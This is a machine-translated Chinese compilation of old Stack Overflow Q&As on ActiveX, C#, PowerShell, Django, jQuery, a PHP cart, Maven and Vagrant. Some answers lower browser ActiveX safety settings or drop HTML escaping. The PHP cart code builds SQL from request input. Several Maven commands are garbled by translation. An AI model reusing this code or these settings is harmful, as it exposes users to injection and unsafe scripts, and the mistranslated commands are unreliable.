         var size = thefile.size; 
```

我在浏览器中启用了 ActiveX，但仍然收到“激活服务器无法创建对象”错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:32:56.423

这意味着 ActiveX 安全设置设置得太高，不允许代码运行。将您的页面添加到受信任的站点或更改页面所在的浏览器安全区域设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:34:47.747

工具 -> Internet 选项 -> 选择安全选项卡

单击自定义级别按钮并启用以下设置：

*   运行 ActiveX 控件和插件
*   初始化并编写未标记为安全的 ActiveX 控件的脚本。

# c# - 从 C# 中的字典中检索字典

> ID：12839563
> 
> 赞同：1
> 
> 时间：2012-10-11T12:29:07.350
> 
> 标签：c#, dictionary

我有一本这样的字典：

```
{
  "A" : {
    "A1" : {
      "er" : false,
      "hy" : false,
      "fv" : false,
      "fr" : false
    },
    "A2" : {
      "fr" : false,
      "ty" : false,
      "ty" : false,
    },
  "B" : {
    "B1" : {
      "er" : false,
      "hy" : false,
      "fv" : false,
      "fr" : false
    },
    "B2" : {
      "fr" : false,
      "ty" : false,
      "ty" : false,
    },
  }
} 
```

我正在尝试将 A 和 B 字典的值作为单独的字典检索

我试过了

```
Dictionary<string, object> dict =
    jss.Deserialize<Dictionary<string, object>>(json);

Dictionary<string, object> dict1 = dict["A"];//error over here 
```

> 无法将类型“object”隐式转换为“System.Collections.Generic.Dictionary”。存在显式转换（您是否缺少演员表？）

如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:32:01.463

试试这个：

```
Dictionary<string, Dictionary<string, bool>> dict = 
    jss.Deserialize<Dictionary<string, Dictionary<string, bool>>>(json);
Dictionary<string, bool> dict1 = dict["A"]; 
```

# arrays - Powershell：从数组中取出数据并将其放入新数组中

> ID：12839564
> 
> 赞同：2
> 
> 时间：2012-10-11T12:29:08.863
> 
> 标签：arrays, powershell, hashtable

我正在尝试使用以下命令从数组中获取数据：

```
$newarray = $current_ds2_data -match $codenumber 
```

在这种情况下，$current_ds2_data 是作为“Import-Csv”命令的结果的数组，并且 $codenumber 包含我要在数组中搜索的值。这个工作正常。

以下是 $newarray 的值的示例：

```
P_SYS_InternalName  : #D_OCEV_ABC-
P_OCEV_Price        : 0.15
P_NDS_ValidPN       : 12345678
P_OCEV_PriceUnit    : 
P_NDS_VersionNumber : 1 
```

现在我想修改 P_OCEV_Price 字段的值

```
$newarray.P_OCEV_Price = 0.2 
```

但这似乎不起作用。看来 $newarray.P_OCEV_Price 不包含任何值。不知何故，PS 无法将 P_OCEV_Price 识别为数组的一个单元格。

我也尝试过使用

```
$newarray.["P_OCEV_Price"] = 0.2 
```

遵守哈希表格式

在此旁边，我尝试通过使用将 $newarray 显式定义为数组或哈希表

```
$newarray = @() 
```

或者

```
$newarray = @{} 
```

到目前为止，似乎没有任何效果。我究竟做错了什么？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:44:32.010

由于您的`$newarray`变量是一个数组，因此您将无法使用简单的`$newarray.P_OCEV_Price`语法来更改该值。以下是两个可能对您有所帮助的替代选项，具体取决于您的源数据：

```
# Change the price of the first matching item
$newarray[0].P_OCEV_Price = 0.2

# Change the price for all matching items
$newarray | Foreach-Object { $_.P_OCEV_Price = 0.2 } 
```

在这种情况下，我通常想指出大小为 1 的数组很容易与 Powershell 中的单个对象混淆。如果您尝试查看`$newarray`并`$newarray[0]`使用简单的输出语句，结果可能看起来相同。`GetType()`在这些情况下随身携带是个好主意。

```
# This will show a type of Object[]
$newarray.GetType()

# The type here will show PSCustomObject instead
($newarray[0]).GetType() 
```

# python - 如何自定义 django 表单验证

> ID：12839566
> 
> 赞同：0
> 
> 时间：2012-10-11T12:29:10.397
> 
> 标签：python, django

我是python的新手，django

型号：</p>

```
class Product(model.Model):
    name = models.CharField(max_length = 30)
    warehouse = models.CharField(max_length = 30)

    class Meat:
        unique_together = (('name', 'warehouse'),) 
```

当我提交表格时

如果名称输入字段为空，那么我收到消息：**该字段是......**

如果名称字段值和仓库字段值相等，那么我收到消息：**...存在**

如何自定义验证错误消息（更强的文本）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:46:39.213

您可以覆盖表单中的错误消息：

```
name = forms.CharField(error_messages={
    'min_length': _('Enter a longer name'),
})

warehouse = forms.CharField(error_messages={
    'invalid': _('Enter a unique combination'),
}) 
```

查看 django 表单源以查看您可以覆盖的不同错误消息。

[https://github.com/django/django/blob/master/django/forms/fields.py](https://github.com/django/django/blob/master/django/forms/fields.py)

# javascript - 在 javascript/jQuery 中将字符串转换为数字

> ID：12839567
> 
> 赞同：72
> 
> 时间：2012-10-11T12:29:11.567
> 
> 标签：javascript, jquery

一直在尝试将以下内容转换为数字：

```
<button class="btn btn-large btn-info" data-votevalue="1">
    <strong>1</strong>
</button> 
```

```
var votevalue = parseInt($(this).data('votevalue')); 
```

我也尝试过，但在检查结果时`Number()`我仍然得到。`NaN`我究竟做错了什么？

这是完整的代码：

```
<div class="span7" id="button-group">
    <div class="btn-group">
        <button class="btn btn-large btn-info" data-votevalue="1"><strong>1</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="2"><strong>2</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="3"><strong>3</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="4"><strong>4</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="5"><strong>5</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="6"><strong>6</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="7"><strong>7</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="8"><strong>8</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="9"><strong>9</strong></button>
        <button class="btn btn-large btn-info" data-votevalue="10"><strong>10</strong></button>
    </div>
</div> 
```

```
$('#button-group button').each(function() {
    $(this).click(function() {
        $(this).addClass('active');
        var votevalue = parseInt($(this).data('votevalue'));
        var filename = $('.mainimage').data('filename');
        var votes = parseInt($('.mainimage').data('numvotes'));
        var totalscore = parseInt($('.mainimage').data('totalscore'));
        $.ajax({
            type: 'POST',
            url: 'index.php/?category=vote',
            data: {
                "votevalue": votevalue,
                "filename": filename
            },
            success: function() {
                votes++;
                alert(votes);
                var average = ((totalscore + votevalue) / votes);
                $('#vote-incremenet').html(votes);
                $('#display-average').html(average);
                $('#display-average').show();
                $('#button-group button').each(function(){
                    $(this).unbind('click');
                });
            }
        }); // end ajax
    }); // end click
}); // end each 
```

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2012-10-11T12:35:04.780

听起来`this`您的代码中没有指代您的`.btn`元素。尝试使用选择器显式引用它：

```
var votevalue = parseInt($(".btn").data('votevalue'), 10); 
```

另外，不要忘记基数。

* * *

## 回答 #2

> 赞同：54
> 
> 时间：2012-10-11T12:32:35.087

您可以使用[parseInt(string, radix)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt)将字符串值转换为整数，如下面的代码

```
var votevalue = parseInt($('button').data('votevalue'));
​ 
```

[**演示**](http://jsfiddle.net/8sBpk/)

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2014-02-22T22:49:10.890

虽然这是一篇旧文章，但我认为一个简单的函数可以使代码更具可读性并保持 jQuery 链接代码风格：

```
String.prototype.toNum = function(){
    return parseInt(this, 10);
} 
```

可以与 jQuery 一起使用：

```
var padding_top = $('#some_div').css('padding-top'); //string: "10px"
var padding_top = $('#some_div').css('padding-top').toNum(); //number: 10` 
```

或任何`String`物体：

```
"123".toNum(); //123 (number)` 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2017-05-20T10:04:55.260

对于您的情况，只需使用：

```
var votevalue = +$(this).data('votevalue'); 
```

有一些方法可以在 javascript 中将字符串转换为数字。

最好的方法：

```
var str = "1";
var num = +str; //simple enough and work with both int and float 
```

您还可以：

```
var str = "1";
var num = Number(str); //without new. work with both int and float 
```

或者

```
var str = "1";
var num = parseInt(str,10); //for integer number
var num = parseFloat(str); //for float number 
```

不：

```
var str = "1";
var num = new Number(str);  //num will be an object. typeof num == 'object' 
```

仅将 parseInt 用于特殊情况，例如

```
var str = "ff";
var num = parseInt(str,16); //255

var str = "0xff";
var num = parseInt(str); //255 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2016-01-29T14:49:07.670

您应该在 之前使用“+” `$(this)`。这会将字符串转换为数字，因此：

```
var votevalue = +$(this).data('votevalue'); 
```

哦，我建议使用`closest()`方法以防万一:)

```
var votevalue = +$(this).closest('.btn-group').data('votevalue'); 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2012-10-11T12:33:16.203

听起来好像`this`是指的不是你想象的。您在什么情况下使用它？

该`this`关键字通常仅在事件处理程序的回调函数中使用，当您循环一组元素或类似时。在这种情况下，它指的是特定的 DOM 元素，并且可以按照您的方式使用。

如果您只想访问该特定按钮（在任何回调或循环之外）并且没有任何其他使用`btn-info`该类的元素，您可以执行以下操作：

```
parseInt($(".btn-info").data('votevalue'), 10); 
```

您还可以为元素分配一个 ID，并使用它进行选择，如果您想确保只有一个元素与您的选择器匹配，这可能是一种更安全的方式。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2015-09-18T14:51:40.683

您可以`+`在字符串之前添加一个而不使用 parseInt 和 parseFloat 和 radix，简单

样本：

```
var votevalue = +$('button').data('votevalue');

alert(typeof(votevalue)); 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2018-06-01T13:19:02.550

var string = 123（是字符串），

parseInt(参数为字符串);

```
var string = '123';

var int= parseInt(string );

console.log(int);  //Output will be 123. 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-12-12T21:34:03.550

`var votevalue = $.map($(this).data('votevalue'), Number);`

# python - 加载 Django 应用程序进行开发

> ID：12839570
> 
> 赞同：0
> 
> 时间：2012-10-11T12:29:17.810
> 
> 标签：python, django, django-models, python-module

所以，我已经有了这个设置，我在我的 python 安装的 site-packages 目录中安装了一个 django 项目（包含 settings.py 和 manage.py 的目录）。我这样做是为了使用其他软件包中的应用程序，效果很好。然而，我注意到，当我开发时，开发服务器（manage.py runserver）从站点包目录加载文件。

示例：有一个文件 views.py，它使用以下命令从 models.py 加载模型：

```
from models import Project, Test 
```

由于我试图修复的生产代码中的一个小错误，仍然会在开发服务器中弹出，并且 django 错误页面（如此好的功能）显示了安装在站点包中的文件中的旧代码。所以，我输入了这一行：

```
import models
print models.__file__ 
```

结果正是我想要的文件，来自我的开发目录。下一行，从模型导入项目，测试从站点包目录加载模型，这完全不是我想要的。

我想我已经污染了命名空间，我猜从导入导入已经从内存中加载了导入，但是正常的导入行导入了一个尚未在内存中的模块。这显然导致了能够成功更改views.py并查看开发服务器中的更改的奇怪效果。

有人知道如何解决这个问题吗？

系统信息：

*   Python2.7
*   Django1.3
*   Debian

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T13:08:03.810

这就是[virtualenv](http://www.virtualenv.org/en/latest/index.html)的用途。它创建了隔离的开发环境，对于同时处理多个项目/版本是必不可少的。

# php - 使用 Jquery / Ajax 更新购物车

> ID：12839571
> 
> 赞同：2
> 
> 时间：2012-10-11T12:29:18.940
> 
> 标签：php, jquery, ajax, cart

我刚刚[在这里](http://ksul.kittenpile.com/product.php?action=viewproduct&idsubcat=5&catparent=38)建立了购物车 添加到购物车按钮可以完美地将产品添加到购物车而无需刷新整个页面。

我的问题是，如何让购物篮在点击添加到购物车链接后更新内容而不刷新页面

我有代码来处理将产品添加到购物车并显示购物车内容。

```
<?php
if($what=="addtocart")
{
     if ($cart)
     {
        $cart .= ','.$_GET['product_id'];
     } 
     else 
     {
            $cart = $_GET['product_id'];
     }
     $_SESSION['cart'] = $cart;
}
echo writeShoppingCart();
?> 
```

这里是 writeShoppingCart() 函数

```
function writeShoppingCart() {
    $cart = $_SESSION['cart'];
    if (!$cart) {
        return '<p>You have no items in your shopping cart</p>';
    } else {

echo "<table class=table cellpadding=5 cellspacing=0 width=87% border=0>";
echo "<tr class=bold>";
echo "<td width=65>ID Product</td>";
echo "<td>Pattern</td>";
echo "<td>Inst Type</td>";
echo "</tr>";
    include "config.php";
    global $dbhost,$dbusername,$dbpassword;
    $id_mysql = mysql_pconnect($dbhost,$dbusername,$dbpassword);
    mysql_select_db($dbname, $id_mysql);
    $cart = $_SESSION['cart'];
        $items = explode(',',$cart);
        $contents = array();
        foreach ($items as $item) {
            $contents[$item] = (isset($contents[$item])) ? $contents[$item] + 1 : 1;
        }
        foreach ($contents as $id=>$qty) {
        $view2 = "SELECT * FROM $table_product WHERE id='$id'";
        $result2 = mysql_query($view2);

        while
            ($baris=mysql_fetch_row($result2))
            {
echo "<tr>";
echo "<td>$baris[1]</td>";
echo "<td>$baris[2]</td>";
echo "<td>$baris[3]</td>";
echo "</tr>";
            }   

        }
        echo "</table>";
        echo "<span class=\"go_cart\">&raquo;&nbsp;<a href=\"cart.php\">View Complete Basket</a></span>";
    }
} 
```

`echo writeShoppingCart();`将产品添加到购物车后是否有任何重新加载的线索？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:42:41.083

`session_start()`您在打开标签后忘记添加，`<?php`所以我认为您在执行此操作时引用了一个空变量：`$_SESSION['cart'] = $cart;` $_SESSION['cart'] 保持为空以使用会话变量，您始终必须将 session_start 放在页面顶部;

```
<?php session_start();
   //your stuff here
?> 
```

我刚刚检查了你的页面，我注意到你在 wordpress 中工作，wordpress 不支持使用会话变量，所以你必须在你的主题中寻找接收第一个控件的页面，它通常是 header.php在您的主题目录中：`/yourroot/wp-content/themes/yourthemename/header.php`，您必须在该页面的顶部添加上面的代码。

另外：我警告`resp`从“添加链接”返回的内容，它返回整个网页，您调用的 php 脚本应该在 wordpress 之外，最好在您直接访问的文件中，这样当返回结果时，您只有您正在回显的函数的输出

如果您仍然有错误，请发表评论

//动态改变项目表的代码；

```
$(document).ready(function(){

    $('a#add-link').bind("click", function(event) {
        event.preventDefault();
        var url = $(this).attr("href");
        $.get(url, function (resp) {
            jAlert('Product Has Been Added to Shopping Cart');
            //to do the following you have to put your shoppingcart table in a div with the id="shoppingcart"
            $("#shoppingcart").html(resp)
        });
    });
}); 
```

PS：因为我认为您会忘记这一点，因为我正在为您编写所有代码。
现在您的帖子页面：“http://ksul.kittenpile.com/product.php”返回整个网页，如果您在`alert(resp);`jAlert() 函数上方添加该行，您会注意到这一点。
它不应返回整个网页，因此不应像打印其他页面一样将其打印到浏览器！只有 writeShoppingCart() 的结果应该被回显，没有别的！

# c# - Telerik MVC 网格和数据库中的分页/排序/过滤

> ID：12839578
> 
> 赞同：0
> 
> 时间：2012-10-11T12:29:52.647
> 
> 标签：c#, sql-server, entity-framework, telerik-grid, telerik-mvc

我正在使用带有 AJAX 绑定的 Telerik Grid MVC。

我认为如果我向网格提供 IQueryable，分页/排序/过滤将在数据库服务器上完成。像这样：

```
[GridAction]
public ActionResult Select()
{
    return View(new GridModel(Mapper.Map<IEnumerable<DokumentVM>>(db.Dokumenti)));        
} 
```

我在数据库中创建了大约 10000 个文档的测试数据，上面的命令导致每个文档都被拖入网格。显然，这需要永远。

网格通过 AJAX 绑定，如下所示：

```
@(Html.Telerik().Grid<ViewModels.DokumentVM>()
.DataBinding(b => b.Ajax().Select("Select", "Dokument"))
.Pageable(p => p.PageSize(20))
.Sortable(s => s.SortMode(GridSortMode.MultipleColumn).OrderBy(m => { m.Add("Date").Descending(); m.Add("Number").Descending(); }))) 
```

在 Select ActionMethod 内部，在检查请求（其表单）时，我看到网格发送了正常运行所需的所有信息：

```
page:     1
size:     20
orderBy:  Date-desc~Number-desc 
```

但是当我进一步检查发送到数据库的 SQL 命令时，我发现只有 SELECT 命令存在，没有 WHERE，没有 ORDER by，什么都没有，这会降低我的所有数据。

我想知道分页/排序/过滤是否可以自动工作，或者我是否需要自己将网格发送的信息转换为 SQL 命令。我的印象是，我所需要的只是提供 IQueryable，其余的由 Grid 完成。但这对我不起作用。

也许我做错了什么，或者这甚至不可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T16:09:31.410

问题是使用 AutoMapper！当您致电此行时：

```
 return View(new GridModel(Mapper.Map<IEnumerable<DokumentVM>>(db.Dokumenti))); 
```

首先，AutoMapper 尝试将所有`db.Dokumenti`行转换为内存函数中的新形式。之后，映射的数据传递给 GridModel。所有关于分页和排序的事情都发生在这个类中。

因此，您应该避免在此级别使用 AutoMapper 并使用不同的策略。例如，您可以进行如下查询：

```
var q= from r in db.Dokumenti select new DokumentVM(){ ... } 
```

然后将`q`变量传递给`GridModel`类。

# localization - TYPO3 和 locallang.xml 文本显示为“数组”而不是流体模板内的文本

> ID：12839582
> 
> 赞同：0
> 
> 时间：2012-10-11T12:30:00.587
> 
> 标签：localization, typo3

`locallang.xml` 我在使用I have this时遇到了一些问题：

```
<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<T3locallang>
    <meta type="array">
        <type>module</type>
        <description>Language labels for BE plugin</description>
    </meta>
    <data type="array">
        <languageKey index="default" type="array">
            <label index="mlang_testtext">This is a test text to be translated</label>
        </languageKey>
        <languageKey index="es" type="array">
            <label index="mlang_testtext">Esto es un texto de prueba para ser traducido</label>
        </languageKey>
    </data>
</T3locallang> 
```

在流体模板内部，我可以使用

```
<f:translate key="mlang_testtext" /> 
```

但如果我尝试

```
{LLL:mlang_testtext} 
```

我得到的只是文字`Array`

此外，如果我在部分模板中同时尝试它们，它们都不起作用。

编辑：有些地方我不能`<f:translate .../>`在按钮标签中使用，所以我也需要其他表单

我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:56:07.737

检查`/typo3/sysext/fluid/Classes/ViewHelpers/TranslateViewHelper.php`正确内联用法的示例，例如，将标签设置为输入字段的默认值如下所示：

```
<f:form.textfield name="myTextBox" value="{f:translate(key: 'mlang_testtext')}" /> 
```

# java - LDAP 重新启动导致连接被拒绝错误

> ID：12839584
> 
> 赞同：2
> 
> 时间：2012-10-11T12:30:04.117
> 
> 标签：java, ldap, redundancy

我正在使用 ldapjdk 1.4.2_05_b04。我正在使用配置的 2 个 LDAP 进行负载测试。当负载测试运行时，我将关闭 LDAP1 并将请求发送到 LDAP2。请找到以下场景：

```
 **LDAP1**          **LDAP2**
 1)  UP                  UP
 2)  DOWN                UP
 3)  RESTART             UP
 4)  UP                  DOWN
 5)  UP                  RESTART
 6)  UP                  UP 
```

以上场景完成，在第 6 步之后，请求不会发送到任何 LDAP。

任何建议或帮助都是可观的，这是非常关键的问题。请帮助我解决问题。提前致谢。

# android - Android 固定链接参数

> ID：12839588
> 
> 赞同：0
> 
> 时间：2012-10-11T12:30:28.827
> 
> 标签：android, json, url, cakephp, parameters

我有列表视图分页的问题。我的 json 数据来自`cakephp`基于网站。

如您所知 cakephp 分页：`www.domain.com/index/page:2`

Android 传递如下参数：`www.domain.com/index?page=2`

那么如何将参数传递给我的 cakephp？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:10:44.407

在 2.x 中，您可以将 Paginator 组件配置为使用查询字符串而不是命名参数。检查[手册](http://book.cakephp.org/2.0/en/core-libraries/components/pagination.html#pagination-with-get-parameters)。

# iphone - SA_OAuthTwitterEngine 无法在我的时间线上发布消息

> ID：12839590
> 
> 赞同：0
> 
> 时间：2012-10-11T12:30:33.370
> 
> 标签：iphone, ios, twitter

我在我的应用程序中使用 SA_OAuthTwitterEngine 在我的时间轴上发布消息。在我更新到 ios6 之前没问题。所以现在它不起作用。这是我在我的应用程序委托中登录 twitter 的方式：

```
SA_OAuthTwitterEngine *engine;//ivar

if (self.engine == nil)
{
    self.engine = [[SA_OAuthTwitterEngine alloc] initOAuthWithDelegate:self];
    self.engine.consumerKey = kOAuthConsumerKey;
    self.engine.consumerSecret = kOAuthConsumerSecret;
}

UIViewController *controller = [SA_OAuthTwitterController controllerToEnterCredentialsWithTwitterEngine:self.engine delegate:self];

if (controller == nil)
    return;

[self.window.rootViewController presentModalViewController:controller animated:NO]; 
```

从 SA_OAuthTwitterEngine 委托方法：

```
- (void)OAuthTwitterController:(SA_OAuthTwitterController *)controller authenticatedWithUsername:(NSString *)username
{
  [self.engine sendUpdate:[NSString stringWithFormat:@"test"]];
} 
```

我尝试将消息发送到我的时间线。但是我的时间线上没有任何消息。看起来可以使用身份验证，但不会向时间线发送消息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T16:05:26.737

如果 SA_OAuthTwitterEngine 正在使用 MGTwitterEngine 进行实际的推文，它可能已经停止工作。Twitter 关闭了一些 MGTwitterEngine 正在使用的 API 端点。

在这里看到这个问题：[Twitter 状态 API 突然返回错误 '34'](https://stackoverflow.com/questions/12837319/twitter-status-api-suddenly-returning-error-34/12837393#comment17378795_12837393)

毫无疑问，随着人们意识到事情已经停止工作，许多其他人很快就会到来。

# android - 手动生成 R.java

> ID：12839596
> 
> 赞同：2
> 
> 时间：2012-10-11T12:31:04.117
> 
> 标签：android, r.java-file

我目前正在做一个项目，从 UML 模型自动生成非常简单的 Android 应用程序。Java 部分和 XML 部分都工作正常，但我遇到了一个问题：R.java 文件。

正如我所看到的，我必须选择生成 R.java 文件的选项。

1.  首选方法是让 Android SDK 根据 XML 文件为我生成它。但我怎么能这样做呢？我无法像通常那样打开 Eclipse 并选择“清理项目”，因为这应该是一个自动化过程。有没有我可以运行的命令行命令？像 apk -generateR -/path/R.java 这样的东西会很完美。
2.  我看到的另一种可能性是自己生成它，只需枚举所有资源并输出 R.java 格式的文件。

如果备选方案 2 是唯一方法，那么我遇到的主要问题是如何生成数字。R.java 中一个典型的项目序列如下：

```
 public static final int button_buy=0x7f020000;
    public static final int button_search=0x7f020001;
    public static final int cover=0x7f020002;
    ...
    public static final int Artist_name=0x7f05000e;
    public static final int Artist2_name=0x7f05001c;
    public static final int Artist2NameLabel=0x7f05001d; 
```

那是怎么产生的？数字重要吗？如果我只是从零开始，然后数数通过它们，现在（以及将来的版本？）一切都会奏效吗？

```
 public static final int button_buy=0x00000000;
    public static final int button_search=0x00000001;
    public static final int cover=0x00000002;
    ...
    public static final int Artist_name=0x00000003;
    public static final int Artist2_name=0x00000004;
    public static final int Artist2NameLabel=0x00000005; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:47:29.043

您可以使用 ant 脚本来构建您的项目。R.java 将自动生成，就像您在 Eclipse 中使用“清理项目”选项一样。

在这里阅读更多：http: [//developer.android.com/tools/projects/projects-cmdline.html](http://developer.android.com/tools/projects/projects-cmdline.html)

我不建议直接使用 R.java 文件。

# java - 在 Windows 7 上将 JAudiotagger 库添加到 Java

> ID：12839598
> 
> 赞同：2
> 
> 时间：2012-10-11T12:31:09.220
> 
> 标签：java, groovy

我是一个（非常）业余的程序员。我正在使用 Groovy 编辑 MP3 文件标签。以前（大约两年前），我`JAudiotagger`使用自述文件中给出的详细说明将类库添加到我的 Java 安装中`JAudiotagger`，然后从我的 Groovy 脚本中调用所需的类。但是，最新版本的 中没有自述文件（我可以找到），`JAudiotagger`到目前为止我还没有弄清楚该怎么做。

请有人给我关于如何添加`JAudiotagger`到 Java 的简单说明，例如，我需要下载哪些文件，从哪里下载以及如何处理它们。

我正在运行 Windows 7。

感谢所有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T08:56:50.970

最简单的方法是简单的下载 jAudioTagger 的 jar 并将它放在你的 classpath 中，所以当程序启动时，jar 中的类应该是可以访问的：[java classpath](http://www.leepoint.net/notes-java/background/13files_and_directories/20classpath.html)

现在，如果您想要一种更通用的方式来完全处理依赖项，我建议您开始阅读有关[maven](http://maven.apache.org/)（它是一个具有依赖管理的构建工具）的信息。

你也可以使用[gradle](http://www.gradle.org/)，它看起来更适合 groovy，但我不知道。

至于用 maven 开始一个新项目，它需要一些步骤。这是一个轻量级的教程：

1.  创建一个maven项目
2.  在 pom.xml 中添加所需的依赖项
3.  使用嵌入的库构建项目
4.  运行程序

### 创建一个maven项目

在命令行中键入以下命令：

> mvn archetype:generate -DarchetypeGroupId=org.apache.maven.archetypes -DarchetypeArtifactId=maven-archetype-quickstart -DarchetypeVersion=5-SNAPSHOT

它会问你一些问题，比如组 id 和工件 id 以及项目名称。

### 在 pom.xml 中添加所需的依赖项

pom.xml 是您配置项目的地方，例如构建事物和依赖项，以将 audiotagger 作为依赖项添加以下内容：

> ```
>  <dependency>
>       <groupId>org.jaudiotagger</groupId>
>       <artifactId>jaudiotagger</artifactId>
>       <version>2.0.1</version>
>   </dependency> 
> ```

这会将 jaudiotagger 添加到项目的依赖项中，您也可以添加 groovy。您还需要 groovy 和[groovy 编译器](http://groovy.codehaus.org/Groovy-Eclipse+compiler+plugin+for+Maven)的依赖项。

*提示*：我使用[sonatype](https://repository.sonatype.org/index.html)来查找依赖项

### 使用嵌入的库构建项目

现在用 maven 构建你的项目。只需键入以下命令：

> mvn 干净安装

但这不会将依赖项添加到您的 jar 中，因此您需要通过在 pom.xml 配置中添加插件来嵌入它们：

> ```
>  <artifactId>maven-assembly-plugin</artifactId>
>    <configuration>
>        <archive>
>            <manifest>
>                <mainClass>be.phury.audiotagger.Audiotagger</mainClass>
>            </manifest>
>        </archive>
>        <descriptorRefs>
>            <descriptorRef>jar-with-dependencies</descriptorRef>
>        </descriptorRefs>
>    </configuration> 
> ```

您现在可以通过在命令行中键入来生成具有依赖项的 jar：

> mvn clean install 组件：单个

### 运行程序

只需运行 jar

希望这可以帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T14:36:59.390

如果你不想通过 Maven/Gradle，你也可以使用 @Grapes 注释：

```
@Grapes(
    @Grab(group='org.jaudiotagger', module='jaudiotagger', version='2.0.1')
) 
```

在您的 Groovy 脚本之上，无论您从哪里开始脚本，它都会下载您的依赖项。我找到了依赖项[http://mvnrepository.com/artifact/org.jaudiotagger/jaudiotagger/2.0.1](http://mvnrepository.com/artifact/org.jaudiotagger/jaudiotagger/2.0.1) - 他们甚至为你制作了完整的@Grapes 符号。

# php - 将 php 变量设置为 html

> ID：12839601
> 
> 赞同：1
> 
> 时间：2012-10-11T12:31:27.483
> 
> 标签：php, html

我正在将 php 变量的值设置为一些 html。IE

```
$_img = '<a href="some url">hehehehehe</a>'; 
```

然后该变量在 br 标记之后显示在 html 中。但它不会执行其中的 html。而是像`<a href="some url">hehehehehe</a>`. 那么，我的代码有什么问题吗！我该怎么做？

这是在 HTML 中显示的代码，

```
 <?php if ($_item->getComment()): ?> <br/><?php echo $this->escapeHtml($_item->getComment(), array('b','br','strong','i','u')) ?> <?php endif; ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:46:44.207

```
<?php 
    $string = '<a href="http://stackoverflow.com">Hehehe</a>';
    echo $string;
?> 
```

这很好用！html 被“执行”并显示链接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:59:15.933

从你的评论......

> 这是显示的代码`<?php if ($_item->getComment()): ?> <br/><?php echo $this->escapeHtml($_item->getComment(), array('b','br','strong','i','u')) ?> <?php endif; ?>`

正如许多人所预测的那样，看起来您在显示该值时正在对其进行编码。

我不知道该`$this->escapeHtml`函数到底在做什么，但它似乎正在对字符串进行 HTML 编码。

结果是任何标签，例如`<a>`将被发送到浏览器`&lt;a&gt;`，浏览器将**显示**为`<a>`. 浏览器不会将**其**视为标签，因此不会将其视为一个标签。

所以简单的答案是：不要对 HTML 进行编码......

```
<?php echo $_item->getComment(); ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-11T12:48:38.450

我怀疑你只是在呼应变量。

您需要使用 'htmlspecialchars' 方法，如下所示。

```
 <?php
    $new = htmlspecialchars("<a href='test'>Test</a>", ENT_QUOTES);
    echo $new; // &lt;a href=&#039;test&#039;&gt;Test&lt;/a&gt;
    ?> 
```

# unix - 流浪者盒子的本地个性化？

> ID：12839604
> 
> 赞同：1
> 
> 时间：2012-10-11T12:31:37.787
> 
> 标签：unix, provisioning, chef-infra, vagrant

作为一名开发人员，如果我希望我从任何存储库构建的每一个 vagrant box 都包含我的定制，我将如何实现呢？

例如，我有我自己的[vim](http://www.vim.org/)配置、我自己的[tmux](http://tmux.sourceforge.net/)配置、我自己的[git](http://git-scm.com/)配置，而且我希望在我使用的每个环境中都有某些命令行工具`unix`，例如前面提到的[curl](http://curl.haxx.se/)和[ack](http://betterthangrep.com/)。

我希望[Vagrant](http://vagrantup.com/)能够自定义本地版本的签出框配置，但我不知道该怎么做。

我不能使用普通的[Vagrantfile](http://vagrantup.com/v1/docs/vagrantfile.html)，因为它来自存储库。我无法创建自定义[基本框](http://vagrantup.com/v1/docs/base_boxes.html)，因为`Vagrantfile`从存储库中签出的那个指定了它要使用的基本框。

目前我想出的最好方法是创建一个[包含我的配置的存储库，](https://github.com/nottrobin/.shellconfig/)并在我第一次登录到新建的 Vagrant 盒子时通过安装我期望的所有软件`apt-get`然后导入我的配置文件来设置它，但显然如果我要构建很多盒子，这会令人沮丧。

有谁知道我可以如何自动化这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:42:47.003

实际上有一堆s，按[特定顺序](http://vagrantup.com/v1/docs/vagrantfile.html#vagrantfile_load_order)`Vagrantfile`加载。

用于个人/本地自定义的那个位于 中`~/.vagrant.d/`，因此您希望将任何更改应用于您构建的所有框，只需将它们放在`~/.vagrant.d/Vagrantfile`.

瞧！

# cuda - 使用内核参数会导致银行冲突吗？

> ID：12839605
> 
> 赞同：8
> 
> 时间：2012-10-11T12:31:38.373
> 
> 标签：cuda, bank-conflict

